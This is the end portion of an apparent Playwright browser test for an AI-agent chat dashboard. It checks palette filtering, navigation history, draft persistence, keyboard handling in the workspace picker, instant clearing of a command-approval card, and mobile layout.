  await page.waitForSelector(".agy-pal", { timeout: 5000 });
  fx.assert(/All chats/.test(await page.locator(".agy-pal-list").textContent()), "palette lists views", failures);
  fx.assert(/environment checks · doctor/.test(await page.locator(".agy-pal-list").textContent()), "palette lists the setup view", failures);
  await page.type(".agy-pal-input", "overview", { delay: 25 });
  fx.assert((await page.inputValue(".agy-pal-input")) === "overview", "palette input types in order", failures);
  fx.assert(/Overview/.test(await page.locator(".agy-pal-list").textContent()), "list filters while typing", failures);
  await page.keyboard.press("Escape");
  await page.waitForSelector(".agy-pal", { state: "detached", timeout: 5000 });

  // sidebar footer hint stays inside the sidebar (overflow regression)
  const hintFits = await page.evaluate(() => {
    const side = document.querySelector(".agy-side");
    const hint = document.querySelector(".agy-side-foot .agy-hint");
    if (!side || !hint) return false;
    return hint.getBoundingClientRect().right <= side.getBoundingClientRect().right + 1;
  });
  fx.assert(hintFits, "sidebar footer hint stays inside the sidebar", failures);

  // in-app back/forward nav (a PWA window has no browser chrome): buttons appear
  // once you've navigated and grey out at the ends of this session's stack.
  await page.goto(base); // fresh history → overview sits at the start of the stack
  await page.waitForSelector(".agy-side", { timeout: 8000 });
  fx.assert(await page.locator(".hleft .agy-back").count() === 0, "no nav buttons at the fresh overview", failures);
  await page.click(".agy-nav-item:has-text('All chats')");
  await page.waitForSelector(".agy-chatrow", { timeout: 8000 });
  await page.locator(".agy-chatrow").first().click();
  await page.waitForSelector(".agy-comp-bar", { timeout: 8000 });
  const navCls = async (i) => (await page.locator(".hleft .agy-back").nth(i).getAttribute("class")) || "";
  fx.assert(await page.locator(".hleft .agy-back").count() === 2, "back + forward buttons appear after navigating into a chat", failures);
  fx.assert(!(await navCls(0)).includes("disabled"), "back is enabled inside a chat", failures);
  fx.assert((await navCls(1)).includes("disabled"), "forward is disabled at the newest entry", failures);
  await page.locator(".hleft .agy-back").nth(0).click(); // back
  await page.waitForTimeout(200);
  fx.assert(!(await navCls(1)).includes("disabled"), "forward enables after going back", failures);
  await page.locator(".hleft .agy-back").nth(1).click(); // forward
  await page.waitForSelector(".agy-comp-bar", { timeout: 8000 });
  fx.assert((await navCls(1)).includes("disabled"), "forward disables again after going forward", failures);
  // ⌘[ / ⌘] drive the same back/forward from the keyboard
  await page.keyboard.press("Meta+BracketLeft");  // ⌘[ back
  await page.waitForTimeout(200);
  fx.assert(!(await navCls(1)).includes("disabled"), "⌘[ navigates back (forward re-enables)", failures);
  await page.keyboard.press("Meta+BracketRight"); // ⌘] forward
  await page.waitForSelector(".agy-comp-bar", { timeout: 8000 });
  fx.assert((await navCls(1)).includes("disabled"), "⌘] navigates forward (back to the newest entry)", failures);

  // narrow composer column drops the keyboard hint so btw/files/Send never overlap it
  fx.assert(await page.locator(".agy-comp-bar .agy-hint").isVisible(), "keyboard hint visible at a wide composer", failures);
  await page.addStyleTag({ content: ".agy-comp-strip{max-width:360px !important;}" });
  await page.waitForTimeout(150);
  fx.assert(!(await page.locator(".agy-comp-bar .agy-hint").isVisible()), "keyboard hint hidden when the composer is narrow", failures);

  // new-chat draft: an unsent workspace + message survives navigating away AND a reload
  await page.goto(base + "/?new=");
  await page.waitForSelector(".agy-nc-ta", { timeout: 8000 });
  await page.fill(".agy-ws-input", ws);
  await page.fill(".agy-nc-ta", "draft: refactor the parser");
  await page.goto(base); // leave without submitting
  await page.waitForSelector(".agy-side, .agy-side-rail", { timeout: 8000 });
  await page.goto(base + "/?new=");
  await page.waitForSelector(".agy-nc-ta", { timeout: 8000 });
  fx.assert((await page.inputValue(".agy-nc-ta")) === "draft: refactor the parser", "unsent new-chat message survives navigating away", failures);
  fx.assert((await page.inputValue(".agy-ws-input")) === ws, "unsent new-chat workspace survives navigating away", failures);
  await page.reload();
  await page.waitForSelector(".agy-nc-ta", { timeout: 8000 });
  fx.assert((await page.inputValue(".agy-nc-ta")) === "draft: refactor the parser", "unsent new-chat draft survives a reload", failures);
  await page.evaluate(() => { try { localStorage.removeItem("agy-newchat-draft"); } catch {} });

  // WORKSPACE combobox is keyboard-navigable: ↑/↓ move, Enter takes, Esc closes — and
  // ↑/↓ must NOT steal the caret when there is no list to move through (this field
  // exists to edit long absolute paths).
  await page.goto(base + "/?new=");
  await page.waitForSelector(".agy-ws-input", { timeout: 8000 });
  await page.fill(".agy-ws-input", "");
  await page.click(".agy-ws-input");
  await page.waitForSelector(".agy-ws-opt", { timeout: 8000 });
  const nOpts = await page.locator(".agy-ws-opt").count();
  const selIdx = () => page.evaluate(() =>
    Array.from(document.querySelectorAll(".agy-ws-opt")).findIndex((o) => o.classList.contains("sel")));
  const menuOpen = () => page.evaluate(() => document.querySelector(".agy-ws-menu").style.display !== "none");

  fx.assert((await selIdx()) === -1, "ws menu opens with nothing selected", failures);
  await page.keyboard.press("ArrowDown");
  fx.assert((await selIdx()) === 0, "ArrowDown selects the first workspace", failures);
  await page.keyboard.press("ArrowDown");
  // past the last row it wraps back to -1 (the typed text), so with a single-row fixture
  // one more ArrowDown lands there rather than on row 1.
  fx.assert((await selIdx()) === (nOpts > 1 ? 1 : -1), "ArrowDown advances, wrapping past the last row", failures);
  await page.keyboard.press("ArrowUp");
  fx.assert((await selIdx()) === (nOpts > 1 ? 0 : nOpts - 1), "ArrowUp walks the selection back", failures);
  while ((await selIdx()) !== -1) await page.keyboard.press("ArrowUp");
  fx.assert((await selIdx()) === -1, "ArrowUp past the top returns to the typed text", failures);

  await page.keyboard.press("ArrowDown"); // back onto row 0
  const row0 = await page.locator(".agy-ws-opt .p").first().innerText();
  await page.keyboard.press("Enter");
  fx.assert(!(await menuOpen()), "Enter closes the workspace menu", failures);
  fx.assert((await page.inputValue(".agy-ws-input")).length > 0, "Enter fills the workspace from the selection", failures);
  fx.assert((await page.evaluate(() => document.activeElement.className)).includes("agy-nc-ta"),
    "Enter moves focus on to the message box", failures);
  fx.assert((await page.evaluate(() => location.search + location.hash)).includes("new"),
    "Enter does not submit the form or navigate away", failures);
  fx.assert(row0.length > 0, "workspace rows render a path", failures);

  // Escape closes the menu without leaving the page…
  await page.click(".agy-ws-input");
  await page.waitForTimeout(120);
  await page.keyboard.press("Escape");
  fx.assert(!(await menuOpen()), "Escape closes the workspace menu", failures);
  fx.assert((await page.evaluate(() => !!document.querySelector(".agy-ws-input"))),
    "Escape leaves you on the new-chat form", failures);

  // …and with no matches, ↑/↓ stay out of the way of caret movement.
  await page.fill(".agy-ws-input", "zzz-no-such-workspace-zzz");
  await page.waitForTimeout(120);
  fx.assert(!(await menuOpen()), "no matches → no menu", failures);
  await page.keyboard.press("ArrowUp"); // native: caret to start
  const caret = await page.evaluate(() => document.querySelector(".agy-ws-input").selectionStart);
  fx.assert(caret === 0, "ArrowUp keeps native caret movement when there is no list", failures);
  await page.evaluate(() => { try { localStorage.removeItem("agy-newchat-draft"); } catch {} });

  // approval card clears INSTANTLY on Approve — optimistically, before the answer
  // request even resolves, not on the next server poll. Hold the answer response
  // open so only the optimistic path can remove the card.
  await page.goto(base + "/?convo=" + fx.CID);
  await page.waitForSelector(".agy-msg-user", { timeout: 8000 });
  const ap3 = path.join(roots.monRoot, "approvals", fx.CID + ".json");
  fs.writeFileSync(ap3, JSON.stringify({ id: fx.CID + "-a3", conversationId: fx.CID, command: "rm build.tmp", cwd: ws, reason: "cleanup", ts: Math.floor(Date.now() / 1000) }));
  await page.waitForSelector(".agy-convo-approval .agy-approval", { timeout: 10000 });
  let releaseAnswer, answerDone;
  const answerHeld = new Promise((r) => { releaseAnswer = r; });
  const answerFinished = new Promise((r) => { answerDone = r; });
  await page.route("**/api/run", async (route) => {
    const pd = route.request().postDataJSON();
    if (pd && pd.action === "answer-approval") {
      await answerHeld;
      try { await route.fulfill({ status: 200, contentType: "application/json", body: JSON.stringify({ ok: true }) }); } catch {}
      answerDone();
      return;
    }
    return route.continue();
  });
  await page.click(".agy-convo-approval .agy-btn.sm"); // Approve
  await page.waitForSelector(".agy-convo-approval .agy-approval", { state: "detached", timeout: 1500 });
  fx.assert(true, "Approve clears the convo approval card instantly, before the server responds", failures);
  fs.unlinkSync(ap3);        // model the gate consuming the request so the poll can't re-add it
  releaseAnswer();           // let the held answer request finish
  await answerFinished;      // and fully resolve before we detach the route (avoids a fulfill/unroute race)
  await page.unroute("**/api/run");

  // narrow viewport: panels reconcile, no horizontal overflow
  await page.setViewportSize({ width: 390, height: 844 });
  await page.goto(base);
  await page.waitForSelector(".agy-side-rail, .agy-side", { timeout: 8000 });
  const overflowX = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
  fx.assert(overflowX <= 2, "no horizontal overflow at 390px", failures);
  fx.assert(await page.locator(".agy-side-rail").count() === 1, "sidebar collapses to the rail at 390px", failures);
  await page.screenshot({ path: path.join(SHOTS, "mobile.png") });

  fx.assert(consoleErrors.length === 0, "zero console errors (" + consoleErrors.slice(0, 3).join(" | ") + ")", failures);

  await browser.close();
  await s.close();
  claudeStub.close();
  fx.finish(failures, "ui.test");
})().catch((e) => { console.error(e); process.exit(1); });
